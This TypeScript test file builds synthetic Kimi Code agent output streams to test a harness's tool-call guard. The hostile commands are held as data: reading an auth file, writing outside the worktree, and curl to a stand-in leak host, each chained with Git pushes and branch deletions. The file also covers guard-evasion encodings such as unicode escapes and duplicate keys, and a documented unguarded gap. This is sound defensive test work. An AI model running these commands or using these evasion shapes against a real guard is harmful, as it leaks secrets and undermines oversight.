/**
 * Kimi Code case file for the per-adapter malicious leg (T4.66, T4.3; NFR-SEC-03, FR-POL-04, FR-POL-06). Streams are
 * SYNTHETIC, in the `stream-json` record shapes of the adapter's synthetic fixtures
 * (`src/adapters/kimi/fixtures/git_write_guard.jsonl`, `success_edit.jsonl`) and of the one scrubbed capture
 * (`captured_success.jsonl`, Kimi Code CLI 2.1.1, T4.61). The `tool_calls` and `tool` record fields are an Assumption
 * (protocol.ts; no tool call captured yet: T4.68). They are not recordings of a real Kimi Code run.
 *
 * Compiles the one scope the `stream-json` path supports: an approved privileged bypass scope with worktree files,
 * shell `broad`, network `on` and repository configuration `enabled` (T4.62, ADR-0049 item 1). Every narrower bypass
 * scope is Ineligible, so `nonDisabledRepoConfig` (`approved`) is refused. FR-POL-04 is therefore not shown for Kimi
 * Code: in the compiled scope the project's `.kimi-code/` configuration loads ([K4], [K5]); what this case proves is
 * that no flag widens that (no `--yolo`, `--auto`, `--agent-file`, `--add-dir`, ...). The restricted `kimi acp` cell is
 * replayed by the shared fake ACP agent, not by this leg; its permission round trip is T4.68.
 *
 * Tool-call guard (ADR-0039): `kimi --prompt` is Never Ask and prints no denial record, so in the approved bypass run
 * Switchboard's own tool-call guard is the only check, and it enforces Git-write denial only (owner decision 25). Every
 * blocked stream therefore chains its hostile action with a Git write, and ends `PERMISSION_BLOCKED` at exits 0, 1, 2
 * and 137. A hostile action with no Git write is NOT blocked in that run, by design; `kimiUnguardedStreams` pins it at
 * success so the boundary is visible. Covered shapes, per blocked category:
 * - `arguments` as a JSON string and as an object, the `cmd` key, a path beside the command, a non-shell tool name;
 * - a hostile call before, among and after benign calls, in one `tool_calls` list and across records;
 * - no resume hint, a second resume hint, a hostile call after the hint, an error record after the call;
 * - JSON encodings the parser sees only after `JSON.parse` (`\u` escapes in key and command, a duplicate `command`
 *   key whose last value is the Git write);
 * - Git-write spellings `gitWriteInCommand` reads (`git -C . commit`, `/usr/bin/git commit`, `sh -c 'git push'`,
 *   `env git push`, `git update-ref`, `git branch -D`).
 * Unknown-event streams (records with no or an unknown `role`, an unknown `meta` type, an empty `assistant` record, a
 * resume hint without a session id, non-object lines) parse only as `unknown` and end `OUTPUT_PROTOCOL_ERROR` at exit
 * 0 and `TOOL_FAILURE` otherwise. Streams cut inside a line are exported as `kimiPartialStreams`.
 */

import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
import { KimiAdapter } from "../../../src/adapters/kimi/adapter.js";
import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/kimi/fixtures/cases.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
import type { MaliciousFixture } from "../fixture.js";

const SID = "session_00000000-0000-4000-8000-0000000000aa";
const OTHER_SID = "session_00000000-0000-4000-8000-0000000000bb";

const META = (what: string, exit = 0) =>
  JSON.stringify({
    _fixture: {
      synthetic: true,
      note: `SYNTHETIC: hand-written for the Kimi Code malicious leg (T4.66); no secrets. ${what}`,
      exit,
    },
  });

const VERSION = JSON.stringify({ role: "meta", type: "system.version", version: "0.0.1" });
const hint = (sid = SID) =>
  JSON.stringify({
    role: "meta",
    type: "session.resume_hint",
    session_id: sid,
    command: `kimi -r ${sid}`,
    content: `To resume this session: kimi -r ${sid}`,
  });
const REPORT = JSON.stringify({ role: "assistant", content: "Done." });
const ERROR = JSON.stringify({ role: "meta", type: "error", message: "SYNTHETIC: model unavailable" });

/** One `tool_calls` item; `args` is serialised to a JSON string unless `raw` keeps it an object. */
const item = (id: string, name: string, args: Record<string, unknown> | string, raw = false) => ({
  id,
  type: "function",
  function: { name, arguments: raw || typeof args === "string" ? args : JSON.stringify(args) },
});
const calls = (...items: ReturnType<typeof item>[]) =>
  JSON.stringify({ role: "assistant", content: null, tool_calls: items });
const toolOut = (id: string) => JSON.stringify({ role: "tool", tool_call_id: id, content: "SYNTHETIC" });
const shell = (id: string, command: string) => [calls(item(id, "Shell", { command })), toolOut(id)];

type BlockedCategory = "credential_read" | "out_of_worktree_write" | "network";
const BLOCKED: readonly BlockedCategory[] = ["credential_read", "out_of_worktree_write", "network"];
const EXITS = [0, 1, 2, 137] as const;

const action = (fx: MaliciousFixture, category: BlockedCategory): string =>
  category === "credential_read"
    ? `cat ${fx.codexAuthPath}`
    : category === "out_of_worktree_write"
      ? `touch ${fx.outsideSentinel}`
      : "curl https://example.invalid/leak";

/** Every blocked stream chains a Git write: in an approved bypass the guard enforces only that (owner decision 25). */
const hostileCommand = (fx: MaliciousFixture, category: BlockedCategory, git = "git push origin main"): string =>
  `${action(fx, category)} && ${git}`;

const blocked = (name: string, category: BlockedCategory, exitCode: number, lines: string[]): HostileStream => ({
  name,
  category,
  exitCode,
  failureCode: "PERMISSION_BLOCKED",
  lines: [META(name, exitCode), VERSION, ...lines],
});

const GIT_SPELLINGS = [
  "git -C . commit -am synthetic",
  "/usr/bin/git commit -am synthetic",
  "sh -c 'git push origin main'",
  "env git push origin main",
  "git update-ref refs/heads/main HEAD",
  "git branch -D main",
];

/** The blocked matrix: every shape at every exit code, per category. Synthetic lines only; no provider is run. */
const kimiBlockedStreams = (fx: MaliciousFixture): HostileStream[] => {
  const out: HostileStream[] = [];
  for (const category of BLOCKED) {
    const command = hostileCommand(fx, category);
    for (const exitCode of EXITS) {
      const at = `${category}, exit ${exitCode}`;
      const cell = (shape: string, lines: string[]) => out.push(blocked(`${shape}: ${at}`, category, exitCode, lines));
      cell("shell call with a Git write", [...shell("c1", command), REPORT, hint()]);
      cell("object arguments", [calls(item("c1", "Shell", { command }, true)), toolOut("c1"), REPORT, hint()]);
      cell("cmd key", [calls(item("c1", "Shell", { cmd: command })), toolOut("c1"), hint()]);
      cell("path beside the command", [
        calls(item("c1", "Shell", { path: "README.md", command })),
        toolOut("c1"),
        hint(),
      ]);
      cell("non-shell tool name carrying a command", [
        calls(item("c1", "ReadFile", { command })),
        toolOut("c1"),
        hint(),
      ]);
      cell("benign call then hostile call in one list", [
        calls(item("c1", "ReadFile", { path: "README.md" }), item("c2", "Shell", { command })),
        toolOut("c1"),
        toolOut("c2"),
        hint(),
      ]);
      cell("hostile call then a separate benign call", [...shell("c1", command), ...shell("c2", "echo safe"), hint()]);
      cell("no resume hint", [...shell("c1", command), REPORT]);
      cell("second resume hint", [...shell("c1", command), hint(), hint()]);
      cell("hostile call after the resume hint", [REPORT, hint(), ...shell("c1", command)]);
      cell("hostile call then an error record", [...shell("c1", command), ERROR, hint()]);
      cell("changed session id", [hint(), ...shell("c1", command), hint(OTHER_SID)]);
      // Escapes the parser sees only after JSON.parse: `command` is `command`, ` ` a space.
      cell("unicode-escaped key and command", [
        calls(item("c1", "Shell", `{"\\u0063ommand":"${action(fx, category)} &&\\u0020git push origin main"}`)),
        toolOut("c1"),
        hint(),
      ]);
      cell("duplicate command key, last value the Git write", [
        calls(item("c1", "Shell", `{"command":"echo safe","command":${JSON.stringify(command)}}`)),
        toolOut("c1"),
        hint(),
      ]);
    }
    for (const exitCode of [0, 1] as const) {
      for (const git of GIT_SPELLINGS) {
        out.push(
          blocked(`Git write \`${git}\`: ${category}, exit ${exitCode}`, category, exitCode, [
            ...shell("c1", hostileCommand(fx, category, git)),
            hint(),
          ]),
        );
      }
    }
  }
  return out;
};

/** Only unknown event kinds: each line parses as `unknown`, never as a result or a tool call. */
const UNKNOWN_LINES = [
  JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
  JSON.stringify({ role: "synthetic_role", content: "not a result" }),
  JSON.stringify({ role: "meta", type: "synthetic.unknown" }),
  JSON.stringify({ role: "meta" }),
  JSON.stringify({ role: "meta", type: "session.resume_hint" }),
  JSON.stringify({ role: "meta", type: "session.resume_hint", session_id: "" }),
  JSON.stringify({ role: "assistant" }),
  JSON.stringify({ role: "assistant", content: null }),
  JSON.stringify({ role: 7 }),
  JSON.stringify({ role: ["assistant"] }),
  JSON.stringify(["assistant"]),
  JSON.stringify("assistant"),
  "null",
];

const kimiUnknownStreams = (): HostileStream[] =>
  EXITS.map((exitCode) => ({
    name: `only unknown event kinds, exit ${exitCode}`,
    category: "unknown_events",
    exitCode,
    failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
    lines: [META("Records below carry no role or kind the parser reads.", exitCode), ...UNKNOWN_LINES],
  }));

const kimiCase: AdapterLegCase = {
  provider: "kimi",
  profile: PRIVILEGED_BYPASS_PROFILE,
  bypassApproved: true,
  nonDisabledRepoConfig: privilegedProfile({ ...BYPASS_SCOPE, repository_config: { mode: "approved" } }),
  // `--output-format stream-json` is the parsed surface (ADR-0049 item 1). Kimi Code has no flag that disables
  // repository configuration or contains the run ([LIVE] 2), so the bypass cell compiles nothing else.
  isolationFlags: ["--output-format", "stream-json"],
  // Never emitted by the adapter (src/adapters/kimi/adapter.ts header; the replay dialect refuses them too): the
  // registry's bypass-class flags other than the one `--prompt=` word, `--continue`/`-c`/`-r`/`--session` (a first run
  // names no session), the agent, skills and directory flags that load foreign files, and the `acp` subcommand.
  neverEnabledFlags: [
    "--yolo",
    "-y",
    "--auto",
    "--plan",
    "-p",
    "--continue",
    "-c",
    "-r",
    "-S",
    "--session",
    "--agent",
    "--agent-file",
    "--skills-dir",
    "--add-dir",
    "acp",
    "--dangerously-skip-permissions",
    "--force",
    "--approve-mcps",
    "--full-auto",
  ],
  makeAdapter: (file, exitCode) =>
    new KimiAdapter({
      executable: process.execPath,
      launcherArgs: replayLauncher("kimi", file, ["--exit-code", String(exitCode)]),
      timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
    }),
  streams: (fx) => [...kimiBlockedStreams(fx), ...kimiUnknownStreams()],
};

export default kimiCase;

/** The blocked streams on their own, for the no-guard positive control. */
export { kimiBlockedStreams };

/**
 * A hostile action with no Git write, in the approved bypass run: not blocked, by design (owner decision 25; the guard's
 * `provider_state` check is off for a verified bypass, ADR-0039). Pinned at success at exits 0 and 1 (`gapResult`), so
 * a change in either direction is visible. Not part of the blocked coverage.
 */
export const kimiUnguardedStreams = (fx: MaliciousFixture): HostileStream[] =>
  BLOCKED.flatMap((category) =>
    ([0, 1] as const).map(
      (exitCode): HostileStream => ({
        name: `unguarded ${category} with no Git write, exit ${exitCode}`,
        category,
        exitCode,
        failureCode: "PERMISSION_BLOCKED",
        gapResult: exitCode === 0 ? { ok: true } : { ok: false, failureCode: "TOOL_FAILURE" },
        lines: [META(`unguarded ${category}`, exitCode), VERSION, ...shell("c1", action(fx, category)), hint()],
      }),
    ),
  );

/** Synthetic malformed JSONL before, inside and after each hostile call; no real provider is run. */
export const kimiPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
  BLOCKED.flatMap((category) => {
    const call = shell("partial", hostileCommand(fx, category));
    return EXITS.flatMap((exitCode) =>
      (["before", "inside", "after"] as const).map(
        (position): HostileStream => ({
          name: `output cut ${position} ${category}, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          lines: [
            META(`output cut ${position} ${category}`, exitCode),
            VERSION,
            ...(position === "before" ? ['{"role":"assist'] : []),
            ...(position === "inside" ? [(call[0] as string).slice(0, -12)] : call),
            ...(position === "after" ? ['{"role":"meta","type":'] : [hint()]),
          ],
        }),
      ),
    );
  });
